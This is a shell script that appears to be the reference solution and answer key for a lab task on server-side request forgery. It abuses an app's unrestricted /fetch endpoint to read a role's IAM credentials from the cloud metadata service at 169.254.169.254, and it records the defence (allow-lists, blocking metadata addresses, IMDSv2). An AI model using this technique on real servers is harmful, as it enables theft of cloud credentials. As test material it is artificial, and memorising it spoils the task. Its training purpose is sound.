# Reference solution for ssrf-cloud-metadata. Runs as root inside the container.
#
# The /fetch endpoint fetches any URL server-side with no allow-list. Point it at
# the cloud metadata service (169.254.169.254) to read the instance role's name,
# then its IAM credentials - which the server returns to you (SSRF credential theft).
set -euo pipefail

APP="http://127.0.0.1:8080"
IMDS="http://169.254.169.254/latest/meta-data/iam/security-credentials"

for _ in $(seq 1 40); do
  curl -sf -o /dev/null "$APP/" && break
  sleep 0.5
done

# 1. Use the SSRF to list the instance role name.
ROLE="$(curl -s -G "$APP/fetch" --data-urlencode "url=$IMDS/" | tr -d '[:space:]')"

# 2. Use the SSRF to fetch that role's IAM credentials; the app writes the flag.
curl -s -G "$APP/fetch" --data-urlencode "url=$IMDS/$ROLE" >/dev/null
sleep 1

cat > /root/answers.txt <<'EOF'
METADATA_IP=169.254.169.254
STOLEN=the instance role's temporary IAM credentials (AWS access key, secret key and token)
DEFENSE=allow-list the hosts the fetcher may reach and block internal/link-local/metadata addresses (169.254.169.254); on AWS, require IMDSv2
EOF
